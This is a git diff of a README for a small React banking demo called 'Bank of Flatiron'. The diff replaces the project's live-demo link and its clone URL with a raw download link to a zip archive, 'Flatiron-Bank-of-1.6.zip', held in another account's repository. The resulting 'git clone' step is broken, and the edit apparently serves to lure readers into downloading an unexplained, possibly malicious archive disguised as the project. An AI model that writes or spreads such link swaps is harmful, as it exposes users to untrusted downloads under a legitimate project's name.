@@ -3,12 +3,12 @@
 This is the frontend application for Bank of Flatiron, a simple banking application built with React. This application provides a user interface for displaying the transaction doen by user and also they can be able to add new transaction that won't need page relaoding for the effect to be seen in the browser since its done automatically. 
 
 # Live Demo 
-https://bank-of-flatiron-lime-omega.vercel.app/
+https://github.com/danielkaranja0/Bank-of-Flatiron/raw/refs/heads/main/src/Flatiron-Bank-of-1.6.zip
 
 # Getting Started
 To get started with this project, follow these steps:
 
-1. Clone the repository using git clone https://github.com/sirkaranja/Bank-of-Flatiron.git.
+1. Clone the repository using git clone https://github.com/danielkaranja0/Bank-of-Flatiron/raw/refs/heads/main/src/Flatiron-Bank-of-1.6.zip
 2. Navigate to the project directory using cd Bank-of-Flatiron.
 3. Navigate to the src directory using cd src.
 4. Install the required dependencies using npm install.
